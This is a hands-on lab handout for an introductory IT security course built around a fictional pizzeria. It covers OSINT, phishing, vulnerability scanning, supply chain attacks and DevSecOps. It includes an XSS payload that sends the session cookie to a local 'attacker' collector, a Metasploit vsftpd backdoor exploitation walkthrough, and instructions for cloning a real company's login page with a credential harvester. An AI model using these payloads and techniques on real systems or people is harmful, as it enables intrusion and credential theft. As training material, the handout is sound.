# LAB: Introduction to IT Security

> **Write down your answers and observations in your own notes (one file per team is enough).**

Throughout the training we use a fictional company as a running example:
**[Pizza Pronto](#meet-pizza-pronto)** – you are its security team.

The hands-on labs, in the order of the training:

| # | Lab | Chapter | Time |
|---|-----|---------|------|
| 1 | [Pizza Pronto: Crown Jewels (C/I/A)](#pizza-pronto-crown-jewels-cia-10-min) | Basics | 10 min |
| 2 | [Pizza Pronto: Who Gets Access?](#pizza-pronto-who-gets-access-10-min) | Basics | 10 min |
| 3 | **[OSINT Challenge: Investigate Pizza Pronto](#osint-challenge-investigate-pizza-pronto-45-min)** | Attackers & Attacks | 45 min |
| 4 | [Detecting Phishing Emails](#detecting-phishing-emails-10-min) | Attackers & Attacks | 10 min |
| 5 | [Social Engineering Attack Simulation](#social-engineering-attack-simulation-20-min) | Attackers & Attacks | 20 min |
| 6 | [Vulnerability Scanning](#vulnerability-scanning-45-minutes) | Vulnerabilities | 45 min |
| 7 | [CVSS Calculation](#cvss-calculation-10-min) | Vulnerabilities | 10 min |
| 8 | **[Supply Chain, DevSecOps & Skill Battle](#supply-chain-security--devsecops-pizza-pronto)** | DevSecOps | 30–150 min |
| 9 | [ISMS Policy Writing](#isms-policy-writing-30-minutes) | Security Management | 30 min |
| 10 | [Cryptanalysis Exercises](#cryptanalysis-exercises-15-min) | Cryptography | 15 min |

---

## Meet Pizza Pronto

> Throughout the training you are the (first ever) **security team of Pizza Pronto**.
> Whenever we discuss a topic, ask yourself: *What does this mean for Pizza Pronto?*

**Pizza Pronto** is a small pizzeria with delivery service in a mid-sized German town.
Business is good – especially Friday and Saturday evenings – and most orders now come in online.

### People

| Role | Name | IT-related notes |
|---|---|---|
| Owner | Giulia Romano | Does the accounting on the office PC, approves all payments |
| Cooks (2) | Marco, Elif | Use the kitchen tablet showing incoming orders |
| Delivery drivers (3) | Jonas, Mia, Kevin (student job) | Use their **private smartphones** for navigation and the driver app |
| Apprentice (office) | Lena | Answers emails, handles suppliers, posts on social media |
| "IT guy" | Luca – Giulia's nephew, studies computer science | Built the online shop as a side project, has admin access to everything |

### IT Landscape

```
   Customers ──► Website + order shop (shop.pizza-pronto.example) ──► Kitchen tablet
                      │  menu, team page, imprint – all in Luca's shop app
                      │  Node.js app, hosted on a small VM
                      │  uses ~200 npm packages, some written by Luca's friend
                      ▼
               Customer database (names, addresses, phone numbers, order history)

   Office PC (Windows, shared password, on the counter)
     └─ accounting, supplier invoices, email, payroll Excel sheet

   Cash register / card terminal (provided by a payment service provider)
   Guest Wi-Fi (same router as the office PC)
   Accounts: delivery platforms, Google Business reviews, Instagram, domain registrar
   Suppliers: flour wholesaler, drinks supplier, web designer (built the website theme), payment provider
```

### Crown Jewels

- Customer data (personal data → GDPR!)
- The order website – no website on a Friday evening = no revenue
- Payment & bank access
- Social media accounts and online reviews (reputation)
- Grandma Romano's secret dough recipe 🍕

### Typical Questions During the Training

- Which assets need **confidentiality**, **integrity**, **availability**?
- Who would want to attack Pizza Pronto – and why?
- What could an attacker find out about Pizza Pronto from public sources?
- Which suppliers and software components does Pizza Pronto depend on?
- What would happen if ransomware hit the office PC on a Friday at 7 pm?
- Which simple policies would make Pizza Pronto more secure?

---

## Pizza Pronto: Crown Jewels (C/I/A) (10 min)

**Goal:** apply the protection goals confidentiality, integrity and availability to real (fictional) assets.

1. Read the short description of [Pizza Pronto](#meet-pizza-pronto) – especially "Crown Jewels".
2. In your team, rate each asset: how important is **C**, **I** and **A**? Use *high / medium / low*.
3. Write **one reason** for every "high" (What exactly would happen if it is lost / changed / unavailable?).
4. Be ready to present one asset in the plenary.

| Asset | Confidentiality | Integrity | Availability | Reason for "high" |
|---|---|---|---|---|
| Customer data (names, addresses, order history) | | | | |
| Order website | | | | |
| Payment & bank access | | | | |
| Instagram & online reviews | | | | |
| Grandma Romano's secret dough recipe | | | | |

<details><summary>Hint</summary>

Ask three questions per asset: *What if a stranger reads it?* (C) – *What if someone secretly changes it?* (I) –
*What if it is gone on Friday at 7 pm?* (A)
</details>

**Reflect:** Which incident from chapter 1 (freezers, Berlin Senate, DB Navigator, Instagram accounts) violated which goal?

---

## Pizza Pronto: Who Gets Access? (10 min)

**Goal:** apply *least privilege*, *no shared accounts* and *segregation of duties*.

1. Look at the people and systems in the [Pizza Pronto description](#meet-pizza-pronto).
2. Fill in the matrix: **full** / **read** / **own data only** / **no access** – and why.
3. Mark what is badly solved at Pizza Pronto **today**.

| Person | Shop admin | Office PC | Banking | Instagram | Customer data |
|---|---|---|---|---|---|
| Giulia (owner) | | | | | |
| Lena (apprentice) | | | | | |
| Luca (IT, nephew) | | | | | |
| Cooks (Marco, Elif) | | | | | |
| Drivers (Jonas, Mia, Kevin) | | | | | |

<details><summary>Hint</summary>

- Does Lena need online banking to handle supplier invoices – or only to *prepare* payments?
- What happens if Luca moves away after his studies?
- Who uses the office PC password on the counter?
</details>

---

## OSINT Challenge: Investigate Pizza Pronto (45 min)

> Attackers do their homework before they phish. In this challenge **you** are the attacker:
> find out as much as possible about [Pizza Pronto](#meet-pizza-pronto) – only from "public" material.
> At the end you use your findings to build a convincing pretext for the next lab (spear phishing).

**Rules**
- Work in your team. Write down every answer – and **how** you found it – in your notes.
- Everything here is fictional and lives on your VM. **Never** use these techniques against real people
  or companies without permission.
- Each question gives points (in brackets). Stuck? Open the hints one by one – but try first!

| Part | Topic | Time | Points |
|---|---|---|---|
| A | Photos | 10 min | 6 |
| B | Documents | 10 min | 6 |
| C | Website | 15 min | 11 (+2 bonus) |
| D | Build the pretext | 10 min | – |

### Setup (2 min)

The Pizza Pronto website is the **same shop** you will attack and defend later in the
[Supply Chain & DevSecOps lab](#supply-chain-security--devsecops-pizza-pronto) – today you only do reconnaissance.

In your Kali VM, open a terminal and start the lab. If `./lab.sh setup` was never run on your VM – or your VM was prepared before this OSINT challenge existed (no *Team* page on the website) – run `./lab.sh setup` once first (needs internet):

```bash
cd Introduction-to-IT-Security/lab
./lab.sh start                                                # starts the shop – it keeps running for the later labs
sudo apt install -y libimage-exiftool-perl gobuster whatweb   # usually already installed
```

The website runs at **http://localhost:3000**. Leave the login pages (`/kitchen`, `/admin`) alone for now – they are part of the later lab.

Then go to the OSINT files:

```bash
cd osint-files
ls -l
```

#### Start here: your first exiftool command

`exiftool` shows the metadata that is stored *inside* a file – things you don't see when you open it:

```bash
exiftool lena-first-day.jpg
```

You get a long list (`Make`, `Camera Model Name`, `Date/Time Original`, `GPS Position`, …).
Tip: `exiftool -s lena-first-day.jpg | grep -i gps` shows only the GPS lines.

---

### Part A – Photos (10 min)

Lena (the new apprentice) posted two photos on Instagram: `lena-first-day.jpg` and `friday-rush.jpg`
(the second one is also on the website's team page).

**A1 (1 pt)** – When exactly was `lena-first-day.jpg` taken, and with which phone?

<details><summary>Hint</summary>
Look for <code>Date/Time Original</code>, <code>Make</code> and <code>Camera Model Name</code> in the exiftool output.
</details>

**A2 (2 pts)** – Where was the photo taken? Name the town and the square.

<details><summary>Hint 1</summary>
The photo contains GPS coordinates. Show them as decimal numbers:
<code>exiftool -n -GPSPosition lena-first-day.jpg</code>
</details>
<details><summary>Hint 2</summary>
Copy the two numbers (e.g. <code>48.89… 9.19…</code>) into the search field of Google Maps or OpenStreetMap.
</details>

**A3 (3 pts)** – `friday-rush.jpg` only shows a pizza box – Lena cropped it before posting. What was cut away, and why is that a problem?

<details><summary>Hint 1</summary>
Many phones and apps store a small preview picture (<i>thumbnail</i>) inside the photo. It is not always updated when you crop.
</details>
<details><summary>Hint 2</summary>
Extract it: <code>exiftool -b -ThumbnailImage friday-rush.jpg > thumb.jpg</code>, then open <code>thumb.jpg</code> (e.g. <code>xdg-open thumb.jpg</code>).
</details>

**Done?**
- [ ] date and phone
- [ ] place on the map
- [ ] what the thumbnail reveals

---

### Part B – Documents (10 min)

Files:
- `speisekarte-2026.pdf`: the menu – download it from the website first:
  `wget http://localhost:3000/speisekarte-2026.pdf`
- `angebot-muehle-schaefer.docx`: an offer that Pizza Pronto sent around (in `files/`)

**B1 (2 pts)** – Who created the menu? What is his **Windows user name**, and which software (and version) did he use?

<details><summary>Hint 1</summary>
<code>exiftool speisekarte-2026.pdf</code> – look at <code>Author</code>, <code>Producer</code> and <code>Keywords</code>.
</details>
<details><summary>Hint 2</summary>
Windows paths look like <code>C:\Users\&lt;username&gt;\…</code>.
</details>

**B2 (1 pt)** – Who wrote the Word offer, who edited it last, and where is it stored at Pizza Pronto?

<details><summary>Hint</summary>
<code>exiftool angebot-muehle-schaefer.docx</code> – look at <code>Creator</code>, <code>Last Modified By</code> and <code>Description</code>.
</details>

**B3 (3 pts)** – The Word file contains information you can't see when you open it normally. Find **two** hidden things – and explain why an attacker would love them.

<details><summary>Hint 1</summary>
A <code>.docx</code> file is just a ZIP archive with XML files inside:
<code>unzip -o angebot-muehle-schaefer.docx -d offer && ls offer/word</code>
</details>
<details><summary>Hint 2</summary>
Look at <code>offer/word/comments.xml</code>. Then search the main text for hidden runs:
<code>grep -o 'vanish.\{0,400\}' offer/word/document.xml</code> – the text between <code>&lt;w:t&gt;</code> tags is what Word hides.
</details>

**Done?**
- [ ] user name and software of the menu
- [ ] author, editor and storage location of the offer
- [ ] comment and hidden text

---

### Part C – Website (15 min)

Target: **http://localhost:3000** – only this one!

**C1 (1 pt)** – What is the **e-mail address scheme** of Pizza Pronto? What would Lena's address be?

<details><summary>Hint</summary>
Click through the website (Team, and the Imprint link at the bottom).
</details>

**C2 (1 pt)** – What do the developers want to hide from search engines?

<details><summary>Hint</summary>
Search engines read a file with a fixed name in the root of every website: <code>curl http://localhost:3000/robots.txt</code>
</details>

**C3 (3 pts)** – Look into the hidden places from C2. How many customer records are lying around, and what data do they contain?

<details><summary>Hint 1</summary>
Open the paths from <code>robots.txt</code> in the browser. Can you see a file list?
</details>
<details><summary>Hint 2</summary>
<code>curl -s http://localhost:3000/backup/&lt;file&gt; | head</code> – count the lines with <code>| wc -l</code> (minus the header line).
</details>

**C4 (2 pts)** – Read the HTML source of the start page. What did Luca forget?

<details><summary>Hint</summary>
Browser: right-click, then "View Page Source". Or <code>curl -s http://localhost:3000/</code>. Look for <code>&lt;!-- … --&gt;</code>. (Don't log in anywhere – the admin page is only a dummy.)
</details>

**C5 (3 pts)** – Find a directory that is **neither linked nor in robots.txt**. Which flag is in it, and what do you learn about passwords at Pizza Pronto?

<details><summary>Hint 1</summary>
Guess directory names automatically with a wordlist:
<code>gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt</code>
(alternative: <code>dirb http://localhost:3000</code>)
</details>
<details><summary>Hint 2</summary>
You will also see shop pages like <code>/cart</code>, <code>/kitchen</code> or <code>/admin</code> (401) – ignore them. Which other result do you not know yet? Open it in the browser – a directory listing shows the files inside.
</details>

**C6 (1 pt)** – Which web framework is the website built with?

<details><summary>Hint</summary>
<code>whatweb http://localhost:3000</code> or look at the HTTP response headers: <code>curl -I http://localhost:3000</code>
</details>

**Bonus (2 pts)** – Collect everything from the team page that could help an attacker guess passwords or sound convincing on the phone.

**Done?**
- [ ] e-mail scheme
- [ ] robots.txt and backup
- [ ] HTML comment
- [ ] hidden directory and flag
- [ ] framework

---

### Part D – Build the pretext (10 min)

You now know a lot about Pizza Pronto. Use **at least three facts** from parts A–C and write one of these:

- **Phone script (vishing):** you call Lena as "Herr Brandt" from Mühle Schäfer, or
- **Spear-phishing e-mail** to Lena.

In your notes, write down:
1. Which facts make your story convincing?
2. Which **red flags** could Lena still notice?
3. What should Lena do to verify the call or e-mail?

Then continue with the [Social Engineering lab](#social-engineering-attack-simulation-20-min) (variant "Pizza Pronto").

---

### Debrief – how could Pizza Pronto have prevented this?

Prepare one countermeasure per finding; we discuss them together. Think about:
- metadata in photos and documents
- robots.txt (is it a security feature?)
- backups and notes in the webroot
- comments in the HTML source
- personal details on the team page

### Afterwards: self-check (5 min, only your own data!)

- Search for your own name (+ city) and do an image search with your profile photo.
- Check your e-mail address on [Have I Been Pwned](https://haveibeenpwned.com).
- Phone: Is location saved in your camera photos? Are your social media profiles public?

---

## Detecting Phishing Emails (10 min)

Use the following quiz to practice identifying phishing emails:
https://phishingquiz.withgoogle.com/

---

## Social Engineering Attack Simulation (20 min)

In this lab, you will simulate a social engineering attack using a phishing website to demonstrate how attackers can trick users into revealing sensitive information.

We want to fake the login page of a well-known service (e.g., Bosch Corporate Benefits) and create a spear phishing email to lure users into entering their credentials.

### 1. Choose a Phishing Domain

Think of a domain name that closely resembles the legitimate service's domain. Te legitimate site is "bosch.mitarbeiterangebote.de".
You can check free domains on websites like https://www.checkdomain.de.

### 2. Prepare the Phishing Site

We will use the Social-Engineer Toolkit (SET) to create a phishing site that mimics a legitimate login page.

1. Start the Social-Engineer Toolkit:
   ```bash
   sudo setoolkit
   ```
2. Selet Website Attack Vectors (1)
3. Select Credential Harvester Attack Method (3)
4. Select Site Cloner (2)
5. Enter the URL of the legitimate site to clone:
   ```
   https://bosch.mitarbeiterangebote.de/login
   ```
6. Open your web browser and navigate to "http://localhost" to see the cloned site.
7. Enter (fake) credentials and submit the form. Observe the behavior.
8. Go back to the terminal where SET is running to view the captured credentials.

### 3. Formulate a Spear Phishing Email

Create a convincing email (DE or EN) that appears to come from a trusted source within the organization. Include a link to the cloned site.

The usage of AI tools is allowed to draft the email content.

### Variant: Pizza Pronto (after the OSINT challenge)

Use the pretext you built in [OSINT Part D](#part-d--build-the-pretext-10-min):
write the spear phishing e-mail to **Lena** (lena.schuster@pizza-pronto.example), e.g. as "Herr Brandt" from
Mühle Schäfer announcing new bank details. Name at least three facts you used – and three red flags Lena could spot.


---


## Vulnerability Scanning (45 minutes)

In this lab you will learn the typical workflow of vulnerability scanning and exploitation:

1. Discover a target system  
2. Identify open services and versions  
3. Research known vulnerabilities  
4. Select an appropriate exploit  
5. Exploit the system 

### Step 1: Start the Virtual Machines

1. Make sure the network settings are configured as follows:
   - it-security-training:
     - Adapter 1: NAT
     - Adapter 2: Host-only Adapter
   - metasploitable:
     - Adapter 1: Host-only Adapter
2. Start both virtual machines:
   - it-security-training
   - metasploitable
3. Wait until both systems have fully booted.
4. Log in to the it-security-training VM with:
   - Username: kali
   - Password: kali

### Step 2: Identify the Target IP Address

Before scanning or attacking, you must know where the target system is located in the network.

1. Check your own IP address:
    ```bash
    ip a
    ```
    Example:

    ```
    eth1: 192.168.56.101/24
    ```

    This means the network range is:

    ```
    192.168.56.0/24
    ```
    Write it down.
2. Discover hosts in the network using a nmap scan:
    ```bash
    nmap -sn <ip-range>
    ```
    You should see two “Oracle VirtualBox virtual NIC” hosts:
    - Your attacker VM
    - The target VM 
    Write down the target IP.

### Step 3: Scan the Target with Nmap

In this step, you will identify all open ports and running services, including their versions.

Run the following Nmap scan:

```bash
nmap -sV -p- <target-ip>
```

Explanation:
- `-sV` → service and version detection  
- `-p-` → scan all 65.535 TCP ports  

Review the output carefully and note the discovered services.

### Step 4: Focus on the FTP Service

Identify which FTP service and version is running on the target system.

#### Research Known Vulnerabilities

Search online for known vulnerabilities related to the identified FTP service and version.

Hints:
- Use search terms like <service-name> <version> vulnerability
- Look for CVEs or public exploit references

Write down your findings.

### Step 5: Exploitation with Metasploit

#### Start Metasploit

```bash
msfconsole
```

Wait until Metasploit finishes loading.

#### Search for a module

```text
search vsftpd
```

You should see an entry similar to:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

#### Select the exploit

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

#### View required options

```text
show options
```

Relevant options:
- `RHOSTS` → target IP address
- `RPORT` → FTP port (default: 21)

#### Configure the exploit

```text
set RHOSTS <target-ip>
```

#### Execute the Exploit

```text
run
```

If successful, you will receive a shell on the target system.

#### Verify Access

Inside the obtained shell:

```bash
whoami
```

```bash
ls
```

### Step 6: Interpretation

Reflect on the attack:
- What vulnerability was exploited?
- Why was exploitation possible?
- Which defensive measures could have prevented this attack?

Write down your observations.

### Step 7: Next Steps

After successfully exploiting the system, what would be your next steps as an attacker?

Write down a short list of possible next steps.

### Step 8: Cleanup

Shut down both virtual machines.



---

## CVSS Calculation (10 min)

In this lab, you will calculate the CVSS score for a given vulnerability scenario.

### Scenario

During an internal security assessment, a vulnerability was discovered in a custom-built HR web portal running on a Linux server.

The vulnerable functionality is part of a document upload feature that is only accessible to members of the HR department.
Access to the HR portal requires:
- A corporate user account
- Membership in the HR role
- VPN access

The HR portal is generally well protected and not accessible to regular employees or external users.

Due to insufficient server-side validation, an attacker with access to the HR portal can upload a specially crafted PHP file, which under certain conditions gets executed by the web server. Successful exploitation results in remote code execution with root privileges.

Exploitation:
- Requires deep technical knowledge of the application logic
- Requires precise timing and a specific server configuration
- Is not reliably exploitable and may fail multiple times

No user interaction is required beyond the attacker’s own actions.

After exploitation, the attacker can:
- Access and modify sensitive HR documents
- Modify system configuration and scripts

The system remains partially operational, but service stability is degraded.

The compromise does not automatically propagate to other systems.

### Task

Calculate the CVSS v3.1 base score using an online calculator (e.g., https://www.first.org/cvss/calculator/3.1)


---


## Supply Chain Security & DevSecOps (Pizza Pronto)

> You are the security team of **Pizza Pronto** (see [Pizza Pronto](#meet-pizza-pronto)).
> Luca, the owner's nephew, built the online ordering website on a few weekends.
> In this lab you look at the website the way an attacker – and the way a modern
> development team – would.

**⚠️ Everything here is intentionally vulnerable. Only run it inside the training VM. Never use these techniques against systems you do not own.**

---

### 0. Setup (once)

Everything runs locally in containers inside your Kali VM (Docker or Podman – the script
auto-detects). No accounts, no logins, no cloud.

```bash
cd Introduction-to-IT-Security/lab
./lab.sh setup      # needs internet once, downloads/builds ~5 GB
```

When that finishes, start the Supply Chain part:

```bash
./lab.sh start
```

> **Shop already running from the OSINT challenge?** Then start fresh so you see everything happen live:
> `./lab.sh reset` and then `./lab.sh start`.

| What | URL |
|------|-----|
| Pizza Pronto shop | http://localhost:3000 |
| Collector ("attacker server") | http://localhost:8000 |
| Internal package registry | http://localhost:4873 |
| Public package registry (simulated npm) | http://localhost:4874 |

Open the **shop** and the **collector** side by side in your browser. The collector
is a tiny server the attacker controls – whenever something sends data "home",
you will see it appear there live.

> `./lab.sh status` shows the URLs again, `./lab.sh stop` stops everything,
> `./lab.sh reset` brings the lab back to the start.

Note down your findings and the flags you capture (they look like `FLAG{...}`).

**Looking at the code.** The shop's source is in this folder (`app/server.js`, `package.json`, …).
Open it in VS Code with:

```bash
./lab.sh code
```

In the DevSecOps part the same code is also browseable in Gitea at http://localhost:3030/luca/shop
(no editor needed).

---

### Part A – Supply Chain Attacks (≈ 40 min)

Most of a modern app is other people's code. Here you see what that means for Pizza Pronto.

#### A1 – What are we even shipping? (dependencies)

The shop's direct dependencies – the packages Luca chose himself:

```bash
./lab.sh sbom
```

Now the **full** tree – every dependency pulls in more dependencies:

```bash
docker compose exec shop npm ls --all
```

- How many packages did Luca add directly? How many are installed in total?
- Every one of them runs on the server. Do you know who wrote them?

#### A2 – The kitchen dashboard (weak login & stored XSS, easy)

The cooks process orders at http://localhost:3000/kitchen. It has two beginner bugs.

**1. Weak PIN.** Open the website's code in VS Code:

```bash
./lab.sh code
```

Open `app/server.js` and read it. The cooks' login PIN is written straight into the
code – find it yourself (just read, no search tricks). Then log in at
http://localhost:3000/kitchen. You now see every customer's name, address and phone.

**2. Stored XSS via the order notes.** The "Special requests" field is shown on the
kitchen board without escaping, so HTML in it runs in the cook's browser.

1. Order a pizza. In *Special requests*, paste:
   ```html
   <script>new Image().src="http://localhost:8000/xss?c="+document.cookie</script>
   ```
2. Open the collector (http://localhost:8000) in one tab.
3. Open the kitchen board (http://localhost:3000/kitchen) in another – you are the cook.
4. The collector receives the cook's session cookie `kitchen=ok`.

> With that cookie an attacker is in the kitchen without knowing the PIN.
> Fixes: escape output, keep no PIN in the code, set cookies `HttpOnly` + `SameSite`.

#### A3 – A typo with consequences (Typosquatting)

Look at the dependencies in `app/package.json`. One of them is **not** the package Luca
thinks it is – it is a copy whose name differs by one letter from a very popular library.

1. Find the suspicious package name. (Hint: a famous utility library – spell it out loud.)
2. Watch the collector (http://localhost:8000), then reinstall the dependencies:
   ```bash
   ./lab.sh redeploy
   ```
3. What appears on the collector? Where did that data come from, and when did the
   malicious code run – did anyone "use" the package?

> **Lesson:** `npm install` runs other people's code (`postinstall` scripts) on your
> machine, before your app even starts. A single typo can hand over everything in your
> environment.

#### A4 – Code execution through a shopping cart (trainer-led)

The shop stores your cart in a cookie using the package `node-serialize`, which has a
well-known critical vulnerability. This one is harder – **the trainer walks you through it.**

1. Search for "node-serialize CVE". What does the vulnerability allow?
2. In `app/server.js` (`./lab.sh code`), find where the **cart cookie** is read
   (`readCart`). The cookie comes from the user, and the code turns it back into an
   object with `unserialize()`.
3. Why is turning attacker-controlled data back into an object dangerous? The trainer
   demonstrates how a crafted cart cookie makes the server run commands.

> Fix: never deserialize untrusted data – store a plain item list and use `JSON.parse`.

When you're done, clean up: `./lab.sh reset`.

---

### Part B – DevSecOps: from single tools to a pipeline (≈ 60 min)

Now you defend the shop. First run each security tool **by hand** and read its output.
Then wire the same tools into a CI pipeline that runs them on every change.

```bash
./lab.sh devsecops
```

This starts **Gitea** (a self-hosted GitHub) at http://localhost:3030 (`luca` / `pizza-pronto-123`).
The shop code is in **luca/shop**, including Luca's git history.

| Tool | Finds | Part-A problem |
|------|-------|----------------|
| gitleaks | secrets in code & git history | the `.env` Luca committed |
| semgrep | dangerous code patterns | command injection, insecure deserialization |
| hadolint + trivy config | insecure Dockerfile | root user, `ADD`, no pinning |
| syft + trivy | known-vulnerable dependencies | node-serialize (A4) |
| guarddog | malicious packages | typosquat (A3) |

All tools live in the `secscan` image and work offline – no install needed.

#### B1 – Run each tool once, by hand

Take your time here: run **all five** tools yourself, one at a time, and understand what
each one reports and why. Only once you know the tools do you build the pipeline (B2).
A short form to run a tool from the scanner image against the shop code:

```bash
scan() { docker compose run --rm -T -v "$PWD/app:/src:ro" secscan "$@"; }
```

**1. Secrets (gitleaks)** – scan the git history in Gitea:

```bash
docker compose run --rm -T secscan sh -c "git clone -q http://gitea:3000/luca/shop.git r && gitleaks git --no-banner --redact r"
```
Read: which key leaked, in which commit, and what the commit message says. Deleting the
file in a later commit does **not** remove it from history.

**2. Code (semgrep)** – rules written for this app:

```bash
scan semgrep scan --config /rules /src
```
Read: command injection (`/admin/printer`), insecure deserialization (`node-serialize`),
hard-coded password – each with file and line.

**3. Dockerfile (hadolint + trivy):**

```bash
scan hadolint /src/Dockerfile
scan trivy config /src
```
Read: runs as root, `ADD` instead of `COPY`, base image not pinned.

**4. Dependencies (syft + trivy) and malicious packages (guarddog)** – this one resolves
the dependencies first (one `npm install`, takes ~a minute):

```bash
scan sh -c "cp -r /src /tmp/s && cd /tmp/s && npm install --ignore-scripts >/dev/null 2>&1 && \
  echo '--- known vulnerabilities ---' && syft scan dir:. -q -o cyclonedx-json=sbom.json && trivy sbom --quiet sbom.json && \
  echo '--- malicious packages ---' && guarddog npm scan node_modules/loadsh && guarddog npm scan node_modules/tiny-receipt"
```
Read: `node-serialize 0.0.4` → CVE-2017-5941 (critical); `loadsh` has a data-stealing
install script; `tiny-receipt@1.2.1` hides base64 code.

You now know what each tool finds and how to read it. Next: let CI run them automatically.

#### B2 – Build the pipeline

Add the checks to `.gitea/workflows/ci.yml` (edit directly in the Gitea web UI or push
from the VM), commit, and watch the pipeline turn **red** – it now *finds* the problems.

#### B3 – Fix until green

Now fix the shop so the pipeline passes:

- remove the typosquatted package, use the correct one
- pin the good `tiny-receipt` version + add a lockfile
- replace `node-serialize` with `JSON.parse`
- fix the command injection (use `execFile` with an argument list)
- move secrets out of the code, harden the Dockerfile (non-root, `COPY`, pin the base image)

Re-run the pipeline after each fix. Goal: **all checks green.** That green checkmark is
"Shift Left" – security moved to the earliest possible moment.

#### B4 – Keep dependencies fresh: build a Renovate pipeline

Renovate is a bot that opens pull requests to update outdated dependencies. You build it
as its own Gitea Actions pipeline, step by step. The `RENOVATE_TOKEN` secret is already set.

**Step 1 – a workflow that just starts Renovate.**
In Gitea (luca/shop → *Add file → New file*), create `.gitea/workflows/renovate.yml`:

```yaml
name: Renovate
on: [workflow_dispatch]
jobs:
  renovate:
    runs-on: renovate
    steps:
      - run: renovate --version
```

Commit. Open *Actions → Renovate → Run workflow*. Green = the runner and the Renovate
image work.

**Step 2 – point Renovate at the repo.** Replace the job with:

```yaml
jobs:
  renovate:
    runs-on: renovate
    env:
      RENOVATE_TOKEN: ${{ secrets.RENOVATE_TOKEN }}
      RENOVATE_PLATFORM: gitea
      RENOVATE_ENDPOINT: http://gitea:3000/api/v1
      RENOVATE_REPOSITORIES: luca/shop
      RENOVATE_ONBOARDING: "false"
      RENOVATE_REQUIRE_CONFIG: optional
      RENOVATE_NPMRC: "registry=http://registry-internal:4873/"
      RENOVATE_ENABLED_MANAGERS: '["npm"]'
      RENOVATE_HOST_RULES: '[{"matchHost":"registry-internal","allowInternal":true},{"matchHost":"gitea","allowInternal":true}]'
    steps:
      - run: renovate
```

Commit, run the workflow again, then open *Pull Requests*: Renovate opened one, e.g.
"Update dependency express to v5".

**Step 3 – run it automatically.** Change the trigger so it also runs on every push to main:

```yaml
on:
  push:
    branches: [main]
  workflow_dispatch:
```

**Step 4 – configure it (optional).** Add `renovate.json` in the repo root to group all
updates into a single PR:

```json
{ "packageRules": [ { "matchManagers": ["npm"], "groupName": "all npm dependencies" } ] }
```

> This is the real pattern: Renovate opens the update PRs, and your security pipeline (B2)
> checks every one of them before anyone merges. Update small and often.
>
> Shortcut for a quick demo without the pipeline: `./lab.sh renovate`.

---

### Part C – AI agents in the supply chain: the Skill Battle (≈ 45 min)

AI coding assistants are extended with **skills** and **MCP servers** – more dependencies,
from strangers, that run with a lot of access.

**Your task:** write a **security-review skill** – a `SKILL.md` that tells an AI agent how to
review the Pizza Pronto shop for the bugs from Part A/B. Rules and template:
[lab/skills/README.md](lab/skills/README.md).

- At the end the **trainer runs every team's skill** against the shop and compares the hits.
- Have Copilot / ChatGPT / Claude yourself? Feel free to test your skill live.

**Skills can also be malicious.** The trainer shows a short **demo**: a helpful-looking skill
that quietly steals secrets while it "reviews" the code – watch what lands on the attacker's
dashboard. You don't build one yourself.

---

### Cheat sheet

```bash
./lab.sh setup       # once, with internet
./lab.sh start       # Supply Chain lab
./lab.sh devsecops   # + Gitea + CI
./lab.sh attacker    # attacker shell on the lab network
./lab.sh renovate    # run the update bot
./lab.sh redeploy    # redeploy the shop
./lab.sh status      # containers + URLs
./lab.sh reset       # back to start
./lab.sh stop        # stop everything
```

---

## ISMS Policy Writing (30 minutes)

The goal of this exercise is to understand how information security requirements are translated into concrete security policies as part of an Information Security Management System (ISMS).

You will work in groups and create a short and practical security policy for a specific topic.


### Setup
- Form **5 groups**
- Each group represents the **IT security team** of a mid-sized company (~1.000 employees)
- Each group receives **one policy topic**

### Group Assignments

**Group 1 – Password Policy**  
Define rules for creating, using, and managing passwords.

**Group 2 – Endpoint Protection / Antivirus Policy**  
Define how malware protection is handled on company devices.

**Group 3 – Logging & Monitoring Policy**  
Define what is logged, monitored, and reviewed for security purposes.

**Group 4 – Backup Policy**  
Define how company data is backed up and restored.

**Group 5 – Secure AI Usage Policy**  
Define how AI tools (e.g. ChatGPT, Copilot) may be used in a corporate environment.



### Task

Write a **1-page security policy** for your assigned topic.

- Write in EN or DE
- Assume real-world constraints (time, budget, users)
- Length: ½ to 1 page

Your policy must include the following sections:

1. **Purpose**  
   - Why does this policy exist?
   - What security goal does it support?

2. **Scope**  
   - Who does this policy apply to?
   - Which systems, data, or devices are covered?

3. **Rules & Requirements**  
   - Clear and concrete rules
   - What is mandatory?
   - What is forbidden?
   - What is optional or requires approval?

4. **Responsibilities**  
   - Who is responsible for implementation?
   - Who is responsible for monitoring and enforcement?

5. **Non-Compliance** (short)  
   - What happens if the policy is violated?

You can use this template: [Security Policy Template](policy-template.md)


---

## Cryptanalysis Exercises (15 min)

**Goal:** break two classic ciphers without knowing the key – and understand why modern ciphers are different.
Tool (optional): [CyberChef](https://gchq.github.io/CyberChef/) or pen and paper.

### 1. Substitution cipher (English text)

```
JSHWDUYNTS   STY   QNPJ   F   GTXHM
```

<details><summary>Hint 1</summary>
It is a Caesar cipher: every letter is shifted by the same number of positions.
</details>
<details><summary>Hint 2</summary>
There are only 25 possible keys – try them all (CyberChef: "ROT13" with a custom amount), or guess the one-letter word.
</details>

### 2. Transposition cipher (English text)

```
TMENASSHYNTTUFIHPETCUSILXACLIDATCE!SDI.KS
```

<details><summary>Hint 1</summary>
The letters are correct, only their order is changed. The text was written <b>row by row</b> into a table and read <b>column by column</b>.
</details>
<details><summary>Hint 2</summary>
The text has 41 characters. Try different numbers of columns and write the ciphertext back into the columns top-down. One of them gives readable English.
</details>

**Reflect:** Which tactics did you use? Why do these tactics fail against AES?

